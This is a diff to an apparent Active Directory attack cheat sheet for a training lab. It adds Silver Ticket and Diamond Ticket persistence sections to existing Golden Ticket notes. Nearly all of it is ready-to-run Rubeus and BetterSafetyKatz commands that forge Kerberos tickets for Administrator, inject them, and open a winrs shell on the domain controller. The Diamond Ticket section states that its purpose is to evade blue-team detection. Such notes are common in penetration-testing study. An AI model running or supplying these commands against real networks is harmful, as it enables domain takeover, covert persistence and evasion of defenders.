@@ -173,7 +173,7 @@ PS> C:\AD\Tools\Rubeus.exe asktgt /user:svcadmin /aes256:<aes256key> /opsec /cre
 ```powershell
 # To perform a Golden Ticket attack. You can use Mimikatz or DCSync to extract the AES key for krbtgt account.
 
-Generate a Golden Ticket using Rubeus
+# Generate a Golden Ticket using Rubeus
 #1- Start a process with Domain Admin Privileges
 PS> C:\AD\Tools\Rubeus.exe asktgt /user:svcadmin /aes256:<aes256key> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
 
@@ -193,7 +193,7 @@ AM" /minpassage:1 /logoncount:35 /netbios:dcorp /groups:544,512,520,513 /dc:DCOR
 C:\AD\Tools> winrs -r:dcorp-dc cmd
 C:\AD\Tools> set username; set computername
 
-Generate a Golden Ticket using BetterSafetyKatz
+# Generate a Golden Ticket using BetterSafetyKatz
 #1- Use the below to create a golden ticket
 C:\Windows\system32>  C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21
 719815819-3726368948-3917688648 /aes256:<aes256key> /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
@@ -202,3 +202,76 @@ C:\Windows\system32>  C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:A
 C:\Windows\system32> klist
 C:\Windows\system32> dir \\dcorp-dc\C$
 ```
+
+# Persistence - Silver Ticket
+```powershell
+# To perform a Silver Ticket attack. You need to extract the TGS (secret) from the service account. There will be no interaction with DC.
+
+# Generate a Silver Ticket using Rubeus
+C:\AD\Tools> C:\AD\Tools\Rubeus.exe silver /service:http/dcorp-dc.dollarcorp.moneycorp.local /rc4:<NTLM> /sid:S-1
+5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
+
+#2- list all tickets
+C:\AD\Tools\Rubeus.exe klist
+
+#3- You have the HTTP service ticket for dcorp-dc, try to access it using winrs
+C:\AD\Tools>winrs -r:dcorp-dc.dollarcorp.moneycorp.local cmd
+C:\Users\Administrator>set username; set computername
+
+# Generate a Silver Ticket using BetterSafetyKatz
+#For accessing WMI, we need to create two tickets - one for HOST service and another for RPCSS.
+#1- Create a HOST service ticket
+C:\AD\Tools> C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:<NTLM> /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
+
+#2- Inject a RPCSS ticket
+C:\AD\Tools> C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:RPCSS /rc4:<NTLM> /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
+
+#3- check if the tickets are present
+C:\Windows\system32> klist
+C:\Windows\system32> C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
+C:\Windows\system32> Get-WmiObject -Class win32_operatingsystem -ComputerName dcorp-dc
+```
+
+# Persisitence - Dimond Ticket
+```powershell
+# When you submit a TGT in a Golden Ticket attack, the blue team can detect it by tracking where the request for that TGT originated. To make detection more difficult, the Diamond Ticket technique was introduced, which complicates the blue team's ability to trace and identify the attack. After receiving the TGT from the KDC (in the sec step) we will edit it and then submit it to the KDC again.
+
+#1- Use Rubeus to generate Dimoed ticket
+C:\Windows\system32> C:\AD\Tools\Rubeus.exe diamond /krbkey:<aes256key> /tgtdeleg /enctype:aes /ticketuser:administrator 
+/domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+
+#2- Use winrs to access the DC
+C:\Windows\system32> winrs -r:dcorp-dc cmd
+C:\Windows\system32> set username
+C:\Windows\system32> set computername
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
